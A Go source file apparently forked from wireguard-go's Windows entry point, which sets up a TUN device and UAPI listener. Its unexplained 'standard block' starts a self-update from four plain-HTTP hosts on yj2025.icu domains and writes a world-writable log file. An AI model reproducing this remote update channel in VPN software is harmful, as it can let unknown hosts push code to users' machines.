/* SPDX-License-Identifier: MIT
 *
 * Copyright (C) 2017-2025 WireGuard LLC. All Rights Reserved.
 */

package main

import (
	"fmt"
	"os"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"

	flag "github.com/spf13/pflag"
	"golang.org/x/sys/windows"
	"golang.zx2c4.com/wireguard/conn"
	"golang.zx2c4.com/wireguard/device"
	"golang.zx2c4.com/wireguard/ipc"
	"golang.zx2c4.com/wireguard/tun"

	logs "github.com/tea4go/gh/log4go"
	"github.com/tea4go/gh/network"
	"github.com/tea4go/gh/utils"
)

const (
	ExitSetupSuccess = 0
	ExitSetupFailed  = 1
)

func printUsage() {
	fmt.Fprintf(os.Stderr, "用法: %s <接口名称>\n", filepath.Base(os.Args[0]))
}

// 标准程序块
var appName string = "wireguard-go"
var appVer string = "v1.1.1"
var IsBeta string
var BuildTime string

func filepathJoin(elem ...string) string {
	path := filepath.Join(elem...)
	if runtime.GOOS == "windows" {
		return strings.ReplaceAll(path, "\\", "/")
	}
	return path
}

func main() {
	//#region 处理输入参数
	pconfile := flag.StringP("confile", "c", "", "配置文件")

	flag.Usage = func() {
		fmt.Printf("使用说明: %s\n", utils.GetFileBaseName(os.Args[0]))
		flag.PrintDefaults()
	}
	flag.Parse()

	//如果参数有环境变量，则优先取环境变量的值
	confile := logs.GetParamString("confile", *pconfile, "/etc/wireguard/wgtun.conf")
	fmt.Println(confile)
	//#endregion
	log_name := os.Getenv("log_name")
	if log_name == "" {
		log_name = appName
	}
	// 标准程序块
	network.SetAppVersion(appName, appVer, IsBeta, BuildTime) //设置应用版本号，便于自动更新
	logsFileName := filepathJoin(os.TempDir(), "ulog_"+log_name+".txt")
	logs.SetLogger("file", `{"filename":"`+logsFileName+`", "perm": "0666","level":5}`)
	logs.StartLogger()
	network.StartSelfUpdate("http://wc192.yj2025.icu:8118", "http://nj.yj2025.icu:23432", "http://wc8.yj2025.icu:8118", "http://wc47.yj2025.icu:23431")
	// 标准程序块

	if len(os.Args) != 2 {
		printUsage()
		fmt.Fprintln(os.Stderr, "错误: 缺少接口名称参数")
		os.Exit(ExitSetupFailed)
	}
	interfaceName := strings.TrimSpace(os.Args[1])

	logger := device.NewLogger(
		device.LogLevelVerbose,
		fmt.Sprintf("%s", interfaceName),
	)
	logs.Notice("正在启动 %s %s", appName, appVer)

	if err := tun.CheckWintunReady(); err != nil {
		logs.Error(err)
		return
	}

	tun, err := tun.CreateTUN(interfaceName, 0)
	if err == nil {
		realInterfaceName, err2 := tun.Name()
		if err2 == nil {
			interfaceName = realInterfaceName
		}
	} else {
		logs.Error("创建 TUN 设备失败, %v", err)
		return
	}

	device := device.NewDevice(tun, conn.NewDefaultBind(), logger)
	err = device.Up()
	if err != nil {
		logs.Error("启动设备失败: %v", err)
	}
	logger.Verbosef("设备已启动")

	uapi, err := ipc.UAPIListen(interfaceName)
	if err != nil {
		logs.Error("UAPI 监听失败: %v", err)
		device.Close()
		return
	}

	errs := make(chan error)
	term := make(chan os.Signal, 1)

	go func() {
		for {
			conn, err := uapi.Accept()
			if err != nil {
				errs <- err
				return
			}
			go device.IpcHandle(conn)
		}
	}()
	logger.Verbosef("UAPI 监听已启动")

	// 等待程序终止

	signal.Notify(term, os.Interrupt)
	signal.Notify(term, os.Kill)
	signal.Notify(term, windows.SIGTERM)

	select {
	case <-term:
	case <-errs:
	case <-device.Wait():
	}

	// 清理

	if uapi != nil {
		uapi.Close()
	}
	device.Close()

	logger.Verbosef("正在关闭")
}
